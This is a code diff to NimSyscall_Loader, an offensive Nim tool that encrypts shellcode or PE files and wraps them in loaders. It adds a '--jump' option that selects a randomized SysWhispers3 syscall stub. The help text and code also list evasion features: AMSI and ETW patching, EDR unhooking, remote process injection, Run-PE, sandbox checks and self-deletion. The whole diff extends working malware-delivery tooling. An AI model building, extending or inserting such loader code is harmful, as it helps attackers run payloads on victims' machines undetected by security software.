@@ -56,7 +56,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.4
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --dll --dllexportfunc=<exportfuncname> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --syswhispers --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --x86]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --dll --dllexportfunc=<exportfuncname> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --syswhispers --jump --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --x86]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -88,6 +88,7 @@ Options:
   --peload    Encrypt a PE to decrypt it on runtime and execute it via a syscall variant of Run-PE
   --hellsgate    Retrieve Syscalls via Hellsgate technique (for patching AMSI/ETW or shellcode execution/PE injection)
   --syswhispers    Embed Syscalls via Syswhispers3 (NimLineWhispers3) technique
+  --jump    When using Syswhispers3, use the jumper_randomized technique
   --replace    Replace common nim IoC's in the loader like the string 'nim'
   --sandbox value    Include Sandbox Checks of your choice into the loader:
                      Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
@@ -143,6 +144,7 @@ var
     callobfs: bool = false
     hellsgate: bool = false
     syswhispers: bool = false
+    jump: bool = false
     getfreshstub: bool = true
     selfdelete: bool = false
     remoteAMSIpatch: bool = false
@@ -260,6 +262,10 @@ if args["--hellsgate"]:
 if args["--syswhispers"]:
   syswhispers = true
   getfreshstub = false
+
+if args["--jump"]:
+  syswhispers = true
+  jump = true
 
 if args["--replace"]:
   replace = true
@@ -735,7 +741,10 @@ if (getfreshstub):
     stub.add(NtProtectSyscallStart)
 
 if (syswhispers):
-    stub.add(WhispersStub)
+    if(jump):
+        stub.add(WhispersJumpStub)
+    else:
+        stub.add(WhispersStub)
 
 if(unhook):
     if(hellsgate):
